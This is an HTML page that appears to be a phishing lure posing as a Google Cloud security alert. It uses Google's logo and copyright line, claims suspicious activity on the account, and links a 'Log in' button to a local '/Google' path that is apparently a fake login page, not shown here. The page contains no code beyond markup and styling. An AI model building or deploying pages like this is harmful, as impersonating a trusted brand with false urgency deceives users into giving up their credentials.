<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Account Security Notice</title>

    <style>
      * {
        box-sizing: border-box;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          Roboto, sans-serif;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background-color: #f5f7fa;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      header {
        width: 100%;
        padding: 20px;
        background-color: #ffffff;
        border-bottom: 1px solid #ddd;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
      }

      header h2 {
        margin: 0;
        color: #444;
        font-weight: 500;
        color: red;
      }
      header img {
        width: 200px;
      }

      main {
        background-color: #ffffff;
        margin-top: 40px;
        padding: 40px;
        border-radius: 12px;
        width: 90%;
        max-width: 420px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
        text-align: center;
      }

      main h1 {
        font-size: 1.4rem;
        margin-bottom: 10px;
      }

      main p {
        color: #555;
        font-size: 0.95rem;
        margin-bottom: 30px;
      }

      .btn {
        width: 100%;
        padding: 12px;
        border-radius: 8px;
        font-size: 1rem;
        cursor: pointer;
        border: none;
        margin-bottom: 12px;
      }

      .btn-primary {
        background-color: #0077ff;
        color: #fff;
      }

      .btn-secondary {
        background-color: #ffffff;
        color: #0077ff;
        border: 1px solid #ccc;
      }

      .btn:hover {
        opacity: 0.9;
      }

      footer {
        margin-top: 20px;
        font-size: 0.75rem;
        color: #888;
      }
    </style>
  </head>

  <body>
    <header>
      <img
        src="https://www.gstatic.com/cgc/google-cloud-logo.svg"
        class="eL4Gxe"
        alt="Google Cloud"
        data-atf="true"
        data-iml="879.7999999523163"
      />
      <h2>Security Alert</h2>
    </header>

    <main>
      <h1>Suspicious Activity Detected</h1>
      <p>
        We noticed unusual activity on this account. Please login your
        information to continue.
      </p>

      <a href="/Google"><button class="btn btn-primary">Log in</button></a>
      <button class="btn btn-secondary">Create an account</button>
    </main>

    <footer><p>&copy; Google 2025</p></footer>
  </body>
</html>
